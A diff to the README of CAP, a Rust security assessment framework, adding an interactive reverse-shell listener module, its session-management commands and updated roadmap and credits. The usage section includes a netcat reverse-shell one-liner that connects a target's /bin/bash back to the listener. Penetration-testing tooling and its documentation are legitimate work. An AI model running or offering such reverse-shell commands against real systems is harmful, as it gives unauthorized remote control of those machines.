@@ -82,6 +82,7 @@ CAP (Comprehensive Assessment Platform) is a research-oriented security orchestr
 | **web-enum** | Web application enumeration | Wordlist-based discovery, status code filtering, verbose mode |
 | **dns-enum** | DNS & subdomain enumeration | Fast concurrent resolution, IPv4/IPv6 support |
 | **port-scan** | Network port scanning | Common ports, service detection, concurrent scanning |
+| **shell** | Interactive shell handler | Penelope-style listener, session management, F12 control menu |
 
 ### Innovative Security Features
 
@@ -120,30 +121,38 @@ CAP (Comprehensive Assessment Platform) is a research-oriented security orchestr
 ## 🏗️ Architecture
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                      CAP Framework                       │
-├─────────────────────────────────────────────────────────┤
-│                                                          │
-│  ┌────────────┐  ┌──────────┐  ┌─────────────────┐    │
-│  │    CLI     │  │   API    │  │  Session Mgmt   │    │
-│  │ Interface  │  │ (Axum)   │  │   (Time-bound)  │    │
-│  └────────────┘  └──────────┘  └─────────────────┘    │
-│                                                          │
-│  ┌────────────────────────────────────────────────┐    │
-│  │          Core Framework                         │    │
-│  │  • Scope Enforcement (IP/Domain whitelist)     │    │
-│  │  • Audit Logger (Cryptographic hash chain)     │    │
-│  │  • Configuration Management                     │    │
-│  └────────────────────────────────────────────────┘    │
-│                                                          │
-│  ┌────────────────────────────────────────────────┐    │
-│  │          Security Modules (Pluggable)          │    │
-│  │  • Web Enumeration                             │    │
-│  │  • DNS/Subdomain Discovery                     │    │
-│  │  • Port Scanning                               │    │
-│  └────────────────────────────────────────────────┘    │
-│                                                          │
-└─────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────┐
+│                      CAP Framework                            │
+├──────────────────────────────────────────────────────────────┤
+│                                                               │
+│  ┌──────────┐  ┌─────────┐  ┌─────────────┐  ┌──────────┐  │
+│  │   CLI    │  │   API   │  │  Session    │  │  Shell   │  │
+│  │Interface │  │ (Axum)  │  │   Mgmt      │  │ Handler  │  │
+│  └──────────┘  └─────────┘  └─────────────┘  └──────────┘  │
+│                                                               │
+│  ┌─────────────────────────────────────────────────────┐    │
+│  │          Core Framework                              │    │
+│  │  • Scope Enforcement (IP/Domain whitelist)          │    │
+│  │  • Audit Logger (Cryptographic hash chain)          │    │
+│  │  • Configuration Management                          │    │
+│  └─────────────────────────────────────────────────────┘    │
+│                                                               │
+│  ┌─────────────────────────────────────────────────────┐    │
+│  │          Security Modules (Pluggable)                │    │
+│  │  • Web Enumeration                                  │    │
+│  │  • DNS/Subdomain Discovery                          │    │
+│  │  • Port Scanning                                    │    │
+│  └─────────────────────────────────────────────────────┘    │
+│                                                               │
+│  ┌─────────────────────────────────────────────────────┐    │
+│  │          Shell Listener (Penelope-Style)             │    │
+│  │  • Interactive Terminal (F12 Menu)                  │    │
+│  │  • Multi-Session Management                         │    │
+│  │  • Non-blocking I/O                                 │    │
+│  │  • Background/Foreground Control                    │    │
+│  └─────────────────────────────────────────────────────┘    │
+│                                                               │
+└──────────────────────────────────────────────────────────────┘
 ```
 
 ---
@@ -269,6 +278,60 @@ cap module --name port-scan --target 192.168.1.100
 # Fast scan (more threads)
 cap module --name port-scan --target 192.168.1.100 \
   --threads 100
+```
+
+### Shell Listener (Penelope-Style)
+
+CAP includes an advanced shell listener with interactive session management, similar to Penelope:
+
+```bash
+# Start interactive shell listener
+cap shell listen --host 0.0.0.0 --port 4444
+
+# Connect from target
+# On target machine: nc <your-ip> 4444 -e /bin/bash
+```
+
+#### Interactive Control Menu
+
+When connected to a shell, press **F12** to open the control menu:
+
+- **View all active shell sessions** - See all connected shells
+- **Switch between sessions** - Move between shells without disconnecting
+- **Background sessions** - Keep shells running in background
+- **Foreground sessions** - Bring backgrounded shells to focus
+- **Terminate sessions** - Kill specific shell connections
+- **Automatic cleanup** - Removes terminated sessions
+
+#### Features
+
+- **Non-blocking I/O** - Handle multiple shells simultaneously
+- **Session persistence** - Shells remain active when backgrounded
+- **Real-time output** - Live shell output with minimal latency
+- **Keyboard-driven interface** - Full keyboard navigation
+- **Session state tracking** - Active/Background/Terminated states
+- **Auto-cleanup** - Periodic cleanup of dead connections
+
+#### Shell Commands
+
+```bash
+# List shell sessions (when listener is running)
+cap shell list
+
+# Attach to most recent session
+cap shell attach
+
+# Attach to specific session
+cap shell attach --id <session-id>
+
+# Background a session
+cap shell background <session-id>
+
+# Foreground a session
+cap shell foreground <session-id>
+
+# Terminate a session
+cap shell kill <session-id>
 ```
 
 ### Wordlist Management
@@ -433,12 +496,19 @@ timeout_seconds = 300
 
 ## 🚧 Roadmap
 
+### Completed Features
+
+- [x] Interactive shell listener (Penelope-style)
+- [x] Advanced session management with F12 control menu
+- [x] Non-blocking I/O for multiple shells
+- [x] Background/foreground session switching
+
 ### Planned Features
 
 - [ ] TLS/mTLS support for API
 - [ ] Persistent session storage (SQLite)
 - [ ] HTML/PDF report generation
-- [ ] Interactive shell sessions (with full audit)
+- [ ] Enhanced shell audit logging
 - [ ] Real-time collaboration (WebSocket)
 - [ ] SIEM integration (Splunk, ELK)
 - [ ] Module plugin system
@@ -483,12 +553,15 @@ MIT License - See [LICENSE](LICENSE) file for details.
 Inspired by:
 - **Sliver** - Modern C2 framework architecture
 - **Metasploit** - Modular assessment framework design
+- **Penelope** - Interactive shell handler and session management
 - **Gobuster/Dirsearch** - Web enumeration tools
 
 Built with:
 - **Rust** - Systems programming language
 - **Tokio** - Async runtime
 - **Axum** - Web framework
+- **Ratatui** - Terminal UI framework
+- **Crossterm** - Cross-platform terminal control
 - **Clap** - CLI parsing
 - **SecLists** - Security testing wordlists
 
